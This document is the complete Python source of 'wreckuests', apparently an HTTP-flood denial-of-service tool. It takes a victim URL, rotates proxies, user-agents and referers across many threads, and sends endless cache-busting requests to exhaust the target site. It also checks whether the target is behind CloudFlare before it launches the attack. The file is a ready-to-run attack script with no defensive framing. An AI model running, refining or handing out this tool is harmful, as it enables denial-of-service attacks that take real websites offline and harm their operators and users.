# -*- coding: utf-8 -*-
import sys, os, threading, random, requests, time, getopt, socket, urllib.parse
from threading import Thread, Event
from netaddr import IPNetwork, IPAddress
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse

#versioning
VERSION = (0, 1, 4)
__version__ = '%d.%d.%d' % VERSION[0:3]

#if python ver < 3.5
if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('Python 3.5 or higher is required!')

#naming the files

proxy_file = 'files/proxy.txt'
ua_file = 'files/user-agents.txt'
ref_file = 'files/referers.txt'

# initializing variables
ex = Event()
ips = []
ref = []
ua = []
timeout = 10
proto = ''

# arguments
url = ''
# if http auth
auth = False
auth_login = ''
auth_pass = ''

# main
def main(argv):
	try:
		opts, args = getopt.getopt(argv, 'hv:a:t:', ['help', 'victim=', 'auth=', 'timeout='])
	except getopt.GetoptError as err:
		print(err)
		showUsage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ('-h', '--help'):
			showUsage()
			sys.exit(2)
		elif opt in ('-v', '--victim'):
			if len(arg) >= 1:
				global url
				url = urllib.parse.unquote(arg)
				# defining protocol
				global proto
				link = urlparse(url)
				proto = link.scheme
			else:
				print('Parameter [--victim] must be a string and not to be empty!')
				sys.exit(2)
		elif opt in ('-a', '--auth'):
			global auth
			global auth_login
			global auth_pass
			auth = True
			auth_login = arg.split(':')[0]
			auth_pass = arg.split(':')[1]
		elif opt in ('-t', '--timeout'):
			arg = int(arg)
			if isinstance(arg, int) and arg >= 1:
				global timeout
				timeout = arg
			else:
				print('Parameter [--timeout] must be an integer and not to be less than 1')
				sys.exit(2)
	parseFiles()

def parseFiles():
	#trying to find and parse file with proxies
	try:
		if os.stat(proxy_file).st_size > 0:
			with open(proxy_file) as proxy:
				global ips
				ips = [row.rstrip() for row in proxy]
		else: 
			print('Error: File %s is empty!' % proxy_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % proxy_file)
		sys.exit()
	#trying to find and parse file with User-Agents
	try:
		if os.stat(ua_file).st_size > 0:
			with open(ua_file) as user_agents:
				global ua
				ua = [row.rstrip() for row in user_agents]
		else:
			print('Error: File %s is empty' % ua_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ua_file)
		sys.exit()
	#trying to find and parse file with referers
	try:
		if os.stat(ref_file).st_size > 0:
			with open(ref_file) as referers:
				global ref
				ref = [row.rstrip() for row in referers]
		else:
			print('Error: File %s is empty!' % ref_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ref_file)
		sys.exit()
	#parse end
	# messaging statistics
	print('Loaded: {} proxies, {} user-agents, {} referers'.format(len(ips), len(ua), len(ref)))
	cloudFlareCheck()
	
def request(index):
	err_count = 0
	global url
	while not ex.is_set():
		timestamp = str(int(time.time()))
		headers = {'User-Agent': random.choice(ua),
			'Referer': random.choice(ref) + url,
			'Accept-Encoding': 'gzip;q=0,deflate,sdch',
			'Cache-Control': 'no-cache, no-store, must-revalidate',
			'Pragma': 'no-cache'}
		proxy = {proto: ips[index]}
		try:
			if auth:
				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
			else:
				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout)
			if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
				url = r.headers['Location']
				print('Request was redirected to {}'.format(url))
		except requests.exceptions.ChunkedEncodingError:
			pass
		except requests.exceptions.ConnectionError:
			err_count += 1
		except requests.exceptions.ReadTimeout:
			pass
		if err_count >= 20:
			print("Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
			return

#CloudFlare Check and noticing
def cloudFlareCheck():
	global url
	if isCloudFlare(url) is True:
		print("*** Your target is hidding behind CloudFlare! This attack may not entail any consequences to the victim's web-site.")
		time.sleep(1)
		for i in range(5, 0, -1):
			print('Your attack will be launched in ' + str(i) + ' seconds...', end='\r')
			time.sleep(1)
		print('\nStart sending requests...')
		startAttack()
	else:
		print('Start sending requests...')
		startAttack()


# Creating a thread pool
def startAttack():
	threads = []
	for i in range(len(ips)):
		t = threading.Thread(target=request, args=(i,))
		t.daemon = True
		t.start()
		threads.append(t)
	try:
		while True:
			time.sleep(.05)
	except KeyboardInterrupt:
		ex.set()
		print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
		for t in threads:
			t.join()

def isCloudFlare(link):
	#get origin IP by domain
	parsed_uri = urlparse(link)
	domain = '{uri.netloc}'.format(uri=parsed_uri)
	try:
		origin = socket.gethostbyname(domain)
		iprange = requests.get('https://www.cloudflare.com/ips-v4').text
		#get CloudFlare's IP range
		ipv4 = [row.rstrip() for row in iprange.splitlines()]
		#
		for i in range(len(ipv4)):
			if addressInNetwork(origin, ipv4[i]):
				return True
	except socket.gaierror:
		print("Unable to verify if victim's IP address belong to a CloudFlare's subnet")
		return

def addressInNetwork(ip, net):
    if IPAddress(ip) in IPNetwork(net):
        return True

def showUsage():
	print("Usage: wreckuests.py [-v] <victim's url> [-a] <login:pass> [-t] <timeout>\nPlease, read more about arguments in GitHub repository!")

if __name__ == '__main__':
	main(sys.argv[1:])
